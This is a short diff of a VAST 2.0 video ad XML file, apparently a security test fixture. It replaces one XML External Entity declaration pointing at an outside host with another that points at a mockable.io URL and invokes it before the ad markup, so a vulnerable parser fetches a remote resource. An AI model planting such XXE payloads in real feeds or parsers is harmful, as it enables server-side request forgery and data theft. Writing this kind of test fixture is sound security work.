@@ -1,7 +1,9 @@
-<?xml version="1.0"?>
-<!DOCTYPE ClickThrough [  
-<!ELEMENT ClickThrough (#ANY)>
-<!ENTITY xxe SYSTEM "https://jira.ouroath.com">]>
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://demo0052272.mockable.io/">
+]>
+<r>&sp;</r>
 <VAST version="2.0">
 <Ad id="preroll-1">
 <InLine>
